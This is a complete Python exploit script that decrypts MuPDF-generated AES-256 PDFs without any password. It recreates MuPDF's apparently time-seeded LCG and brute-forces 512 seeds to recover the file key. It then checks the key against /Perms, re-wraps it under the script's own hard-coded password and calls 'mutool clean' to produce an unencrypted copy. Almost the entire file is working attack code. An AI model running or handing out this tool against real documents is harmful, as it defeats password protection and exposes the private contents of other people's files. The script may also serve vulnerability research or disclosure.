#!/usr/bin/env python3
"""Decrypt AES-256 PDFs produced by MuPDF without a password."""

from __future__ import annotations

import argparse
import hashlib
import re
import subprocess
import sys
import tempfile
from pathlib import Path

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

A = 0x5DEECE66D
C = 0xB
MASK48 = (1 << 48) - 1
ACCESS_PASSWORD = b"v12.sh"


def aes_cbc_encrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return encryptor.update(data) + encryptor.finalize()


def random_bytes(seed: int, length: int) -> bytes:
    # Reproduce MuPDF's time-seeded 48-bit LCG.
    state = 0x330E | ((seed & 0xFFFF) << 16) | (((seed >> 16) & 0xFFFF) << 32)
    output = bytearray(length)
    for index in range(length):
        state = (A * state + C) & MASK48
        # fz_memrnd keeps only state bits 17-24.
        output[index] = (state >> 17) & 0xFF
    return bytes(output)


def recover_key(pdf: bytes) -> tuple[int, bytes]:
    permissions_match = re.search(rb"/P\s+(-?\d+)", pdf)
    if not permissions_match:
        raise ValueError("missing /P permission field")
    encrypted_permissions_match = re.search(
        rb"/Perms\s*<([0-9A-Fa-f]{32})>", pdf
    )
    if not encrypted_permissions_match:
        raise ValueError("missing or malformed /Perms field")

    permissions = int(permissions_match.group(1)) & 0xFFFFFFFF
    metadata = b"F" if re.search(rb"/EncryptMetadata\s+false", pdf) else b"T"
    plaintext_prefix = (
        permissions.to_bytes(4, "little")
        + b"\xff\xff\xff\xff"
        + metadata
        + b"adb"
    )
    encrypted_permissions = bytes.fromhex(
        encrypted_permissions_match.group(1).decode()
    )
    zero_iv = bytes(16)
    match = None

    # New PDFs consume 32 random ID bytes before the key. Rewritten PDFs
    # normally consume 16 while changing the second ID, or zero when saved
    # with regenerate-id=no.
    for seed in range(512):
        stream = random_bytes(seed, 100)
        for key_offset in (32, 16, 0):
            key = stream[key_offset : key_offset + 32]
            plaintext = (
                plaintext_prefix + stream[key_offset + 64 : key_offset + 68]
            )
            if aes_cbc_encrypt(key, zero_iv, plaintext) == encrypted_permissions:
                if match is not None:
                    raise ValueError("multiple vulnerable MuPDF key candidates passed /Perms")
                match = seed, key

    if match is None:
        raise ValueError("none of the vulnerable MuPDF key candidates passed /Perms")
    return match


def hardened_hash(password: bytes, salt: bytes) -> bytes:
    block = hashlib.sha256(password + salt).digest()
    last_byte = 0
    round_number = 0
    while round_number < 64 or round_number < last_byte + 32:
        encrypted = aes_cbc_encrypt(block[:16], block[16:32], (password + block) * 64)
        digest = (hashlib.sha256, hashlib.sha384, hashlib.sha512)[sum(encrypted[:16]) % 3]
        block = digest(encrypted).digest()
        last_byte = encrypted[-1]
        round_number += 1
    return block[:32]


def wrap_key_for_access(pdf: bytes, key: bytes) -> bytes:
    # Re-wrap the recovered file key under a password known to this script.
    validation_salt = b"MUPDFVAL"
    key_salt = b"MUPDFKEY"
    user = hardened_hash(ACCESS_PASSWORD, validation_salt) + validation_salt + key_salt
    wrapping_key = hardened_hash(ACCESS_PASSWORD, key_salt)
    encrypted_key = aes_cbc_encrypt(wrapping_key, bytes(16), key)

    patched, user_count = re.subn(
        rb"/U\s*<[0-9A-Fa-f]{96}>",
        b"/U<" + user.hex().upper().encode() + b">",
        pdf,
        count=1,
    )
    patched, key_count = re.subn(
        rb"/UE\s*<[0-9A-Fa-f]{64}>",
        b"/UE<" + encrypted_key.hex().upper().encode() + b">",
        patched,
        count=1,
    )
    if user_count != 1 or key_count != 1:
        raise ValueError("unsupported encryption dictionary layout")
    return patched


def decrypt(input_path: Path, output_path: Path) -> tuple[int, bytes]:
    pdf = input_path.read_bytes()
    if not re.search(rb"/R\s+6(?:\D|$)", pdf) or b"/AESV3" not in pdf:
        raise ValueError("input is not a supported MuPDF AES-256 revision-6 PDF")

    seed, key = recover_key(pdf)
    patched = wrap_key_for_access(pdf, key)

    # A patched temporary credential lets mutool write a clean, unencrypted PDF.
    with tempfile.NamedTemporaryFile(suffix=".pdf") as temporary:
        temporary.write(patched)
        temporary.flush()
        result = subprocess.run(
            ["mutool", "clean", "-p", ACCESS_PASSWORD.decode(), "-D", temporary.name, str(output_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
    if result.returncode != 0:
        detail = result.stderr.strip() or result.stdout.strip() or f"exit status {result.returncode}"
        raise RuntimeError(f"mutool failed: {detail}")
    return seed, key


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Remove password protection from a vulnerable MuPDF AES-256 PDF.",
        epilog="No user or owner password is required. Requires mutool and the cryptography package.",
    )
    parser.add_argument("input", type=Path, help="password-protected input PDF")
    parser.add_argument("output", type=Path, help="unencrypted output PDF")
    return parser.parse_args()


def main() -> int:
    args = parse_args()

    try:
        if not args.input.is_file():
            raise ValueError(f"input file not found: {args.input}")
        if args.input.resolve() == args.output.resolve():
            raise ValueError("input and output must be different files")

        print("[*]", f"Reading {args.input}", file=sys.stderr)
        seed, key = decrypt(args.input, args.output)
        print("[+]", "Recovered and verified the AES-256 file key", file=sys.stderr)
        print("    seed", f"time(NULL) mod 512 = {seed}", file=sys.stderr)
        print("    key ", key.hex(), file=sys.stderr)
        print("[+]", f"Wrote unencrypted PDF to {args.output}", file=sys.stderr)
        return 0
    except (OSError, RuntimeError, ValueError) as error:
        print("[!]", str(error), file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
